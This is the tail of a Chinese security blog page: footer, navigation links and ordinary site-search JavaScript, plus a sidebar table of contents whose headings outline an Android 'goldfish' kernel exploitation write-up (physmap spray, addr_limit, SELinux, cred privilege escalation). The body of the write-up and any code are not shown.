href="http://blingblingxuanxuan.github.io/tags/goldfish/">goldfish</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/10/17/asis-ctf-2022-pwn/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">ASIS CTF 2022 pwn babyscan_1 babyscan_2</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/08/28/CISCN2017-babydriver/"><span class="paginator-prev__text">第一道内核pwn-CISCN2017-babydriver</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">
          环境准备</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95poc"><span class="toc-number">1.1.</span> <span class="toc-text">
          测试poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95exp"><span class="toc-number">1.2.</span> <span class="toc-text">
          测试exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">
          如何调试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">
          漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">
          漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">
          总体思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41-physmap-spray"><span class="toc-number">3.2.</span> <span class="toc-text">
          步骤1. physmap spray</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42-%E6%94%B9%E8%BF%9B%E7%A8%8Baddr-limit"><span class="toc-number">3.3.</span> <span class="toc-text">
          步骤2. 改进程addr_limit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43-%E5%85%B3%E9%97%ADselinux"><span class="toc-number">3.4.</span> <span class="toc-text">
          步骤3. 关闭selinux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44-%E8%8E%B7%E5%8F%96cred-real-cred%E5%9C%B0%E5%9D%80"><span class="toc-number">3.5.</span> <span class="toc-text">
          步骤4. 获取cred&#x2F;real_cred地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A45-%E8%BF%9B%E7%A8%8B%E6%8F%90%E6%9D%83"><span class="toc-number">3.6.</span> <span class="toc-text">
          步骤5. 进程提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A46-%E7%A8%B3%E5%AE%9Ashell"><span class="toc-number">3.7.</span> <span class="toc-text">
          步骤6. 稳定shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E5%85%85"><span class="toc-number">4.</span> <span class="toc-text">
          知识点补充</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-rlimit%E8%B5%84%E6%BA%90%E9%99%90%E5%88%B6"><span class="toc-number">4.1.</span> <span class="toc-text">
          linux rlimit资源限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.</span> <span class="toc-text">
          mmap函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap-min-addr"><span class="toc-number">4.3.</span> <span class="toc-text">
          mmap_min_addr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dir"><span class="toc-number">4.4.</span> <span class="toc-text">
          ret2dir</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socket%E7%9A%84inet-ioctl"><span class="toc-number">4.5.</span> <span class="toc-text">
          socket的inet_ioctl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#inet-ioctl"><span class="toc-number">4.5.1.</span> <span class="toc-text">
          inet_ioctl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sock-get-timestampns"><span class="toc-number">4.5.2.</span> <span class="toc-text">
          sock_get_timestampns</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ns-to-timespec"><span class="toc-number">4.5.3.</span> <span class="toc-text">
          ns_to_timespec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#addr-limit%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6"><span class="toc-number">4.6.</span> <span class="toc-text">
          addr limit访问限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#addr-limit%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.6.1.</span> <span class="toc-text">
          addr limit是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kernel-setsockopt"><span class="toc-number">4.6.2.</span> <span class="toc-text">
          kernel_setsockopt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pipe%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">4.6.3.</span> <span class="toc-text">
          pipe系统调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%97%ADselinux"><span class="toc-number">4.7.</span> <span class="toc-text">
          关闭selinux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thread-info%E4%B8%8Etask-struct"><span class="toc-number">4.8.</span> <span class="toc-text">
          thread_info与task_struct</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task-struct"><span class="toc-number">4.8.1.</span> <span class="toc-text">
          task_struct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#thread-info"><span class="toc-number">4.8.2.</span> <span class="toc-text">
          thread_info</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">5.</span> <span class="toc-text">
          其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#andorid%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="toc-number">5.1.</span> <span class="toc-text">
          andorid模拟器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu-ndk%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83"><span class="toc-number">5.2.</span> <span class="toc-text">
          ubuntu ndk编译环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E5%B9%B6%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7"><span class="toc-number">5.3.</span> <span class="toc-text">
          提取内核代码并恢复符号</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A7%E6%96%B9%E6%B3%95-IDApython%E8%84%9A%E6%9C%AC"><span class="toc-number">5.3.1.</span> <span class="toc-text">
          旧方法 - IDApython脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E6%96%B9%E6%B3%95-vmlinux-to-elf"><span class="toc-number">5.3.2.</span> <span class="toc-text">
          新方法 - vmlinux-to-elf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95linux-3-10%E5%86%85%E6%A0%B8%E9%95%9C%E5%83%8F"><span class="toc-number">5.4.</span> <span class="toc-text">
          编译调试linux-3.10内核镜像</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="toc-number">6.</span> <span class="toc-text">
          参考文档</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">56</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">12</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">34</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="访问人数"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="浏览总量"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', '请输入字符');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>